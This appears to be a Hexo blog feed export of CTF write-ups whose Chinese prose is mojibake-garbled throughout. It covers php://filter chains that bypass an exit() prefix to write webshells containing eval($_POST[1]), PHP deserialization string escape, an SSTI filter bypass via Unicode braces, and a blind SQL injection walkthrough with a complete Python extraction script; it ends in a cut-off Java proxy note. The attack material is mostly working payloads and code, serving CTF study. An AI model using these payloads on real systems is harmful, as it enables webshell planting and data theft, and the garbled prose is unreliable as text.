<p>iconvå‡½æ•°æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œå½“å‰ç¼–ç ï¼Œè½¬æ¢åç¼–ç ï¼Œä¹‹åå†è½¬å›å»ï¼Œæ‰€ä»¥åˆ©ç”¨è¯¥ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åå…¶é“è¡Œä¹‹ã€‚ä½†æ˜¯åœ¨è¿™é‡Œï¼Œåˆ©ç”¨è¯¥å­—ç¬¦ç¼–ç ï¼Œä¼šå¯¼è‡´å‡ºç°ä¹‹å‰çš„+å·çš„é—®é¢˜ï¼Œäºæ˜¯å°±å¤±è´¥äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.utf-7.utf-8/resource=shell.php&amp;txt=?+AD4-+ADw?php phpinfo()+ADs ?+AD4-</span></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®å¤§ä½¬ç»™å‡ºçš„UCS2-2 ç¼–ç çš„æ–¹å¼ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒUCS2çš„ç¼–ç æ–¹å¼æ˜¯2ä½ä¸€æ¬¡è½¬æ¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»ä¿è¯éœ€è¦è½¬æ¢çš„ç¼–ç ä¸º2ä½æ•°ï¼Œä¸å¤Ÿçš„æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç©ºæ ¼å ä½,è€Œæˆ‘ä»¬ä¸Šé¢çš„è½¬æ¢ä¹‹åç›´æ¥ç”¨çš„è¯ï¼Œä¼šå‘ç°æ— æ³•è½¬æ¢ï¼Œè¿™æ˜¯å› ä¸ºå¿…é¡»ä¿è¯&lt;?php exit();ä¹Ÿè¢«æˆåŠŸè½¬æ¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å†å‰é¢å†åŠ ä¸Šä¸€ä¸ª1å³å¯ï¼Œ</p>
<p>æœ€ç»ˆpayloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp phpipfn(o;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>å†™å…¥shellï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp+pvela$(P_SO[T]1;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>4.ç»„åˆä½¿ç”¨ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13/resource=shell.php&amp;txt=1?&lt;uc ciryn$(C_FB[G]1;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>è¿˜å¯ä»¥å°è¯•ä½¿ç”¨srtip_tags+base64çš„æ–¹å¼è¿›è¡Œç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure>

<p>ç»è¿‡è¯¥æ–¹å¼æ„é€ çš„payloadï¼Œä¼šè¿›è¡Œstrip_tagsï¼Œå»é™¤æ‰äº†å‰é¢çš„å†…å®¹ï¼Œä¹‹åå†ç”¨base64è§£å‹äº†æˆ‘ä»¬çš„å†…å®¹ã€‚</p>
<p>è®²å®Œä¸Šé¢çš„ï¼Œå†å›åˆ°wmctfçš„check in2ï¼Œé¢˜ç›®çš„æºç ä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64|dechunk|\.\./i&#x27;</span>, $content))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content, <span class="string">&#x27;&lt;?php exit();&#x27;</span> . $content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤å™¨è¿‡æ»¤äº†å¾ˆå¤šï¼Œæˆ‘ä»¬åªå‰©ä¸‹äº†å‹ç¼©è¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡zlib.inflateè§£å‹å­—ç¬¦ï¼Œä¹‹åå†åˆ©ç”¨zlib.deflateå‹ç¼©çš„æ–¹å¼getshellï¼Œstr.tolowerä¼šåœ¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/zlib.deflate|string.tolower|zlib.inflate|<span class="meta">?&gt;</span><span class="meta">&lt;?php</span>%0deval($_GET[1]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰äºŒæ¬¡ç¼–ç ç»•è¿‡çš„æ–¹å¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/?content=php://filter/write=string.%7%32ot13|<span class="meta">?&gt;</span><span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span>|/resource=shell.php</span></span><br></pre></td></tr></table></figure>

<p> è€Œæ˜¨å¤©çš„æ¯”èµ›è¿‡æ»¤äº†tolower,upperç­‰ç­‰ï¼Œç”šè‡³åˆæŠŠ%è¿‡æ»¤äº†ï¼Œå¯¼è‡´æˆ‘ä»¬æ²¡æ³•ç”¨ä¸Šé¢ä¸¤ä¸ªpayloadäº†ï¼Œä½†æ˜¯æˆ‘ä»¬ä¾ç„¶å¯ä»¥åˆ©ç”¨zlibçš„ deflateï¼Œä¹‹åå†åˆ©ç”¨urlç¼–ç è§£æï¼Œå¾—å‡ºå¦‚ä¸‹payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.strip_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%2</span></span><br><span class="line"><span class="number">8</span>%<span class="number">50</span>%<span class="number">28</span>%ae%<span class="number">2</span>c%<span class="number">2</span>e%<span class="number">49</span>%cd%d5%<span class="number">50</span>%<span class="number">89</span>%<span class="number">77</span>%<span class="number">77</span>%<span class="number">0</span>d%<span class="number">89</span>%<span class="number">8</span>e%<span class="number">8</span>f%d5%b4%b6%b7%<span class="number">03</span>%<span class="number">3</span>C%<span class="number">3</span>F/resourc</span><br><span class="line">e=shell.php </span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>ååºåˆ—åŒ–é€ƒé€¸</title>
    <url>/2020/11/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>ä¹Ÿç®—æ˜¯å¤šåšåšæ€»ç»“å§</p>
<h1 id="å˜é•¿"><a href="#å˜é•¿" class="headerlink" title="å˜é•¿"></a>å˜é•¿</h1><p>ä»ç½‘ä¸Šçœ‹æ¥çš„é‚£ä¹ˆä¸€æ®µä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $pass=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$AA=<span class="keyword">new</span> A();</span><br><span class="line">$res=filter(serialize($AA));</span><br><span class="line"><span class="keyword">echo</span> $res;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$c=unserialize($res);</span><br><span class="line"><span class="keyword">echo</span> $c-&gt;pass;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬éœ€è¦åšåˆ°çš„æ˜¯ï¼Œå¦‚ä½•ä¿®æ”¹$passçš„å€¼ï¼Ÿ</p>
<p>é¦–å…ˆå½“æˆ‘ä»¬åºåˆ—åŒ–ä¸€æ®µAçš„çš„è¯å¾—åˆ°çš„ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>å¹¶ä¸”æˆ‘ä»¬æ³¨æ„åˆ°å®ƒä¼šæŠŠbbå˜æˆcccï¼Œå½“ä»–åºåˆ—åŒ–çš„æ—¶å€™ï¼Œå·²ç»å®Œæˆäº†ï¼Œä½†æ˜¯ç»è¿‡è¿‡æ»¤ä¹‹åå®ƒçš„å­—ç¬¦ä¸²ä¼šå˜é•¿ï¼Œç»å†çš„æ˜¯è¿™ä¹ˆä¸€ä¸ªè¿‡ç¨‹:</p>
<p><img src="image-20201120203006883.png" alt="image-20201120203006883"></p>
<p>åŒæ—¶ï¼Œååºåˆ—åŒ–è¿˜æœ‰è¿™ä¹ˆä¸€ä¸ªç‰¹ç‚¹ï¼Œä¸€æ—¦è¯»å–åˆ°<code>&#125;</code>ï¼Œä»–å°±ä¼šåœæ­¢ï¼Œä¸ä¼šå†è¯»å–åé¢çš„å†…å®¹ï¼Œè¿™æ ·çš„è¯å°±å¾ˆå¥½è§£é‡Šäº†ï¼Œæˆ‘ä»¬æ„é€ payloadå¦‚ä¸‹ï¼š</p>
<p><img src="image-20201120203254613.png" alt="image-20201120203254613"></p>
<p>æˆåŠŸä¿®æ”¹äº†ç»“æœï¼</p>
<p>é‚£ä¹ˆå¦‚æœæ˜¯å˜çŸ­çš„æƒ…å†µä¸‹å‘¢ï¼Ÿ</p>
<h1 id="é•¿çŸ­çš„åŒºåˆ«ï¼š"><a href="#é•¿çŸ­çš„åŒºåˆ«ï¼š" class="headerlink" title="é•¿çŸ­çš„åŒºåˆ«ï¼š"></a>é•¿çŸ­çš„åŒºåˆ«ï¼š</h1><p>å’Œå‰é¢å˜é•¿çš„åŸç†æ˜¯<strong>ä¸ä¸€æ ·çš„</strong>ï¼Œåœ¨ååºåˆ—åŒ–é€ƒé€¸å˜é•¿çš„æƒ…å†µä¸‹ï¼Œä½ éœ€è¦åšçš„æ˜¯æ‹¼æ¥è‡ªå·±åé¢éœ€è¦å†™çš„ä¸œè¥¿ï¼Œæ‰€ä»¥ä½ æ‰€éœ€è¦è¡¥å……çš„é•¿åº¦=ä½ payloadçš„é•¿åº¦ï¼Œå¹¶ä¸”ä½ æ˜¯å†™åˆ°æœ«å°¾å‡ºç°<code>&#125;</code> ä¸ºæ­¢ï¼Œ<strong>ä»¥æ­¤æ¥ä½¿å¾—åé¢çš„å­—ç¬¦ä¸²ä¸§å¤±ä½œç”¨ï¼ï¼ï¼ï¼ï¼ï¼</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæ˜¯å˜çŸ­çš„å­—ç¬¦ä¸²é€ƒé€¸ï¼Œä½ éœ€è¦èƒ½å¤Ÿæ§åˆ¶<strong>ä¸¤ä¸ª</strong>å˜é‡ï¼</p>
<h1 id="å˜çŸ­ï¼š"><a href="#å˜çŸ­ï¼š" class="headerlink" title="å˜çŸ­ï¼š"></a>å˜çŸ­ï¼š</h1><p>è€Œå˜çŸ­åˆ™æˆªç„¶ä¸åŒï¼Œå¦‚æœä½ éœ€è¦å˜çŸ­ï¼Œä½ è¦åšçš„æ˜¯<strong>åƒæ‰ä½ æƒ³è¦ä¿®æ”¹çš„éƒ¨åˆ†çš„å‰é¢çš„partçš„å…¨éƒ¨</strong></p>
<p>æˆ‘ä»¬ä¸€æ ·çš„å…ˆçœ‹æ­£å¸¸çš„æƒ…å†µä¸‹æ˜¯å¦‚ä½•è¿›è¡Œåºåˆ—åŒ–çš„</p>
<p><img src="image-20201120203446153.png" alt="image-20201120203446153"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:9:&quot;dasasdasd&quot;;s:4:&quot;pass&quot;;s:5:&quot;asdas&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæˆ‘ä»¬æƒ³è¦æ“ä½œpasså¯†ç éƒ¨åˆ†ï¼ˆæ§åˆ¶åé¢çš„18æ˜¯ä¸ºäº†æ§åˆ¶é•¿åº¦ï¼‰çš„è¯ï¼Œæˆ‘ä»¬è¦åƒæ‰çš„æ˜¯</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&quot;;s:4:&quot;pass&quot;;s:18:&quot;</span><br></pre></td></tr></table></figure>

<p>é‚£å°±å¾ˆç®€å•äº†ï¼Œæˆ‘ä»¬ç®—ä¸€ç®—è¿™æ®µçš„é•¿åº¦å°±å¥½äº†ï¼ï¼ï¼ï¼ï¼ç®—å‡ºæ¥æ˜¯19ï¼Œé‚£æˆ‘ä»¬å†™38ä¸ªbï¼Œæ‹¼å‡ºæ¥å‰©ä½™19ä¸ªï¼Œä¹‹åå‘¢ï¼Œæˆ‘ä»¬å»å¤å†™å‰é¢çš„é‚£ä¸€æ®µçš„å†…å®¹å°±å¥½äº†ï¼</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:0:&quot;&quot;;&#125;</span><br><span class="line">æ¯”å¦‚æ˜¯è¿™æ ·å“ˆï¼Œæˆ‘ä»¬å¦‚æœå†™19ä¸ªbbï¼Œè¿‡æ»¤ä¹‹åå‰©ä¸‹è¿™äº›ï¼Œè¿™æ ·çš„è¯åˆ°passå‰é¢çš„éƒ¨åˆ†éƒ½æ— äº†å®é™…ä¸Šè¿›å…¥çš„ä¹Ÿå°±å‰©ä¸‹</span><br><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc[ä¸­é—´çš„æ²¡äº†]&quot;;&#125;</span><br><span class="line">é‚£å‡è®¾æˆ‘ä»¬çš„passå†™æˆ:&quot;;s:4:&quot;pass&quot;;s:2:&quot;ab&quot;;&#125;,å†é‡æ–°æ‹¼æ¥ä¹‹åå°±å˜å˜æˆäº†ï¼</span><br><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc;s:4:&quot;pass&quot;;s:2:&quot;ab&quot;;&#125;&quot;;&#125;è¿™æ ·çš„è¯å°±åˆæ­£å¸¸äº†ï¼ï¼ï¼</span><br></pre></td></tr></table></figure>



<p>è¿‡æ»¤ä¹‹ååªå‰©ä¸‹ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:4:&quot;asds&quot;;&#125;&quot;;&#125; </span><br></pre></td></tr></table></figure>

<p>ä¸€äº›é­”æœ¯æ–¹æ³•ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">__wakeup() //ä½¿ç”¨unserializeæ—¶è§¦å‘</span><br><span class="line">__sleep() //ä½¿ç”¨serializeæ—¶è§¦å‘</span><br><span class="line">__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span><br><span class="line">__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span><br><span class="line">__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><br><span class="line">__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span><br><span class="line">__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span><br><span class="line">__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘,è¿”å›å€¼éœ€è¦ä¸ºå­—ç¬¦ä¸²</span><br><span class="line">__invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>å¤ªæ¹–æ¯easyweb</title>
    <url>/2020/11/07/%E5%A4%AA%E6%B9%96%E6%9D%AFeasyweb/</url>
    <content><![CDATA[<p>æ„Ÿè§‰å¤ªæ¹–æ¯çš„é¢˜ç›®éƒ½æŒºéš¾çš„..è¿™æ¬¡è‡ªå·±åˆ¶ä½œå‡ºæ¥ä¸€é“é¢˜ï¼Œæ˜¯ä¸€é“SSTIï¼Œåšçš„æ—¶å€™ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯nodejsè¿›è¡Œå‘½ä»¤æ‰§è¡Œä»€ä¹ˆçš„</p>
<h1 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h1><p>è¿™é“é¢˜çš„éš¾ç‚¹ä¸»è¦æ˜¯è¿‡æ»¤æ‰äº†èŠ±æ‹¬å·ï¼Œå’ŒåŒå¼•å·ç­‰ã€‚</p>
<h1 id="åšé¢˜æ€è·¯"><a href="#åšé¢˜æ€è·¯" class="headerlink" title="åšé¢˜æ€è·¯"></a>åšé¢˜æ€è·¯</h1><p>è¿™é“é¢˜åˆçœ‹å°±æ„Ÿè§‰æ˜¯ä¸€é“SSTIï¼Œä½†æ˜¯åˆšå¼€å§‹çš„æ—¶å€™è¢«èŠ±æ‹¬å·å¡ä½äº†ï¼Œæå¾—æˆ‘ä»¥ä¸ºæ˜¯æ˜¯å…¶ä»–é¢˜ç›®ï¼Œç»“æœç›¸å½“æƒ³åˆ°A1CTFç‹¬è§’å…½é‚£é“é¢˜ç›®ï¼Œæ‰æœ‰äº†æ€è·¯ï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šçš„æ˜¯ï¼Œæˆ‘ä»¬è¾“å…¥ä¸€äº›èŠ±é‡Œèƒ¡å“¨çš„ä¸œè¥¿ä¼šè¢«è½¬æ¢ä¸ºæ ‡å‡†çš„å­—ç¬¦ä¸²è¾“å‡ºï¼Œå¦‚å›¾ï¼š</p>
<p><img src="image-20201107195218392.png" alt="image-20201107195218392"></p>
<p>äºæ˜¯æˆ‘è”æƒ³åˆ°å¯ä»¥é€šè¿‡è¾“å…¥ç±»ä¼¼çš„èŠ±æ‹¬å·çš„utf8ç¼–ç ä¸‹çš„å­—ç¬¦ä¸²è¿›è¡Œç»•è¿‡ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">https://www.compart.com/en/unicode/U+FE5C</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­è¿™ä¸€è¡Œ</p>
<table>
<thead>
<tr>
<th>UTF-8 Encoding:</th>
<th><code>0xEF 0xB9 0x9C</code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>æˆ‘ä»¬å°†0xä¿®æ”¹ä¸ºç™¾åˆ†å·å³å¯</p>
<p><img src="image-20201107195633976.png" alt="image-20201107195633976"></p>
<p>ä¹‹åå°±æ˜¯æ­£å¸¸çš„SSTIäº†ï¼Œæˆ‘ä»¬å°†ä¸éœ€è¦å¼•å·çš„payloadå¾€ä¸Šä¸Šä¸€ç”©å°±è¡Œäº†</p>
<p><img src="image-20201107195717338.png" alt="image-20201107195717338"></p>
<h1 id="äº‹å"><a href="#äº‹å" class="headerlink" title="äº‹å"></a>äº‹å</h1><p>äº‹åå‘ç°å…¶å®è¿˜å¯ä»¥åˆ©ç”¨è¿™ç§æ–¹å¼è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š</p>
<p><img src="image-20201107214148115.png" alt="image-20201107214148115"></p>
]]></content>
      <tags>
        <tag>æ¯”èµ›</tag>
      </tags>
  </entry>
  <entry>
    <title>æå®¢å¤§æŒ‘æˆ˜FinalSql</title>
    <url>/2020/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98FinalSql/</url>
    <content><![CDATA[<h1 id="1-è€ƒç‚¹"><a href="#1-è€ƒç‚¹" class="headerlink" title="1.è€ƒç‚¹"></a>1.è€ƒç‚¹</h1><p>ç›²æ³¨,å­¦ä¹ åˆ°äº†æ–°çš„å§¿åŠ¿ï¼Œå½“æˆ‘ä»¬çš„ifè¢«è¿‡æ»¤çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡^çš„æ–¹å¼æ¥æ“ä½œ</p>
<ul>
<li>?id=1=(è¡¨è¾¾å¼)=1</li>
<li>?id=1^(è¡¨è¾¾å¼)^1</li>
</ul>
<p>^ åœ¨mysqlå½“ä¸­ä»£è¡¨çš„æ˜¯ä½å¼‚æˆ–çš„æ„æ€ï¼Œå‘ƒï¼Ÿç™¾åº¦äº†ä¸€ä¸‹å¤§æ¦‚æ˜ç™½äº†ä¸€äº›</p>
<p>ä¸¤ä¸ªæ•°ç›¸åŒå¾—0ï¼Œä¸åŒå¾—1ï¼›é‚£æˆ‘ä»¬è¿›ä¸€æ­¥æ‹“å±•æ€è·¯ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸¤ä¸ªè¡¨è¾¾å¼ç›¸åŒçš„æ—¶å€™å°±ä¼šè¿”å›1ï¼Œä¸åŒçš„æ—¶å€™å°±ä¼šè¿”å›0</p>
<p>æ‹“å±•æ€è·¯ä¹‹åå¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœï¼š</p>
<p><img src="image-20201119170420138.png" alt="image-20201119170420138"></p>
<p>æ„Ÿè§‰è¿˜æ˜¯ç”¨ç­‰å·æ¯”è¾ƒå¥½ç†è§£å•Š</p>
<p>å½“ä¸¤ä¸ª=å·å¤¹åœ¨ä¸€èµ·çš„æ—¶å€™</p>
<p><img src="image-20201119172606372.png" alt="image-20201119172606372"></p>
<p>æ¡ä»¶æˆç«‹çš„æ—¶å€™å°±è¿”å›å‰é¢çš„åˆ¤æ–­ç»“æœï¼Œä¸æˆç«‹çš„è¯å°±è¿”å›å…¨éƒ¨çš„ç»“æœäº†ã€‚</p>
<p>äºæ˜¯æ„é€ æ³¨å…¥è¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;92644a8a-ea2e-486b-baa0-eedd0947f835.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#x3D;(ascii(substr(database(),1,1))&gt;102)&#x3D;1 </span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æ•°æ®åº“çš„åå­—ï¼šgeek</p>
<p>æ¥ä¸‹æ¥æ³¨å…¥è¡¨åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;92644a8a-ea2e-486b-baa0-eedd0947f835.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#x3D;(ascii(substr(select(group_concat(table_name)from(information_schema.tables) where(table_schema)&#x3D;database()),1,1))&gt;102)&#x3D;1 </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#x3D;(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;&#39;geek&#39;)),1,1))&gt;1)&#x3D;1</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è¡¨åï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">F1naI1y,Flaaaaag</span><br></pre></td></tr></table></figure>

<p>æ³¨å…¥å­—æ®µåï¼š</p>
<p>id,username,password</p>
<p>flagåœ¨F1naI1yé‡Œé¢</p>
<p>æœ€ç»ˆexpï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string, sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7e5cde2c-f8e0-4059-a2e2-6121476516cc.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data = &quot;id=if(ascii(  substr( database() ,1,1)  )&gt;100,1,2)#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stringlist = string.digits + string.ascii_letters</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="comment"># for j in stringlist:</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>, <span class="number">126</span>):</span><br><span class="line">        <span class="comment"># sql = &quot;1=(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j)</span></span><br><span class="line">        <span class="comment"># sql = &quot;1=(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j)</span></span><br><span class="line">        <span class="comment"># sql = &quot;1=(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, j)</span></span><br><span class="line">        sql = <span class="string">&quot;1=(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: sql&#125;</span><br><span class="line">        res = requests.get(url=url, params=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ingyingying~ Not this as wel&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(j)</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">125</span>:</span><br><span class="line">            sys.exit()</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç­”æ¡ˆï¼š</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>é™æ€ä»£ç†</title>
    <url>/2020/11/09/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>å¥½ä¹…æ²¡ç”¨äº†éƒ½æœ‰ç‚¹å¿˜äº†ï¼Œç°åœ¨æ¡èµ·æ¥å­¦ä¸€ä¸‹ï¼Œä¹‹åè¿˜æœ‰ç”¨</p>
<h1 id="é™æ€ä»£ç†"><a href="#é™æ€ä»£ç†" class="headerlink" title="é™æ€ä»£ç†"></a>é™æ€ä»£ç†</h1><h2 id="ç»“åˆå‡ºç§Ÿæˆ¿å­ç†è§£"><a href="#ç»“åˆå‡ºç§Ÿæˆ¿å­ç†è§£" class="headerlink" title="ç»“åˆå‡ºç§Ÿæˆ¿å­ç†è§£"></a>ç»“åˆå‡ºç§Ÿæˆ¿å­ç†è§£</h2><p><img src="%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/image-20201109214003006.png" alt="image-20201109214003006"></p>
<p>é€šè¿‡å›¾ç¤ºï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸ªä¾‹å­ï¼š</p>
<ul>
<li>å®¢æˆ·éœ€è¦ç§Ÿä¸€ä¸ªæˆ¿å­</li>
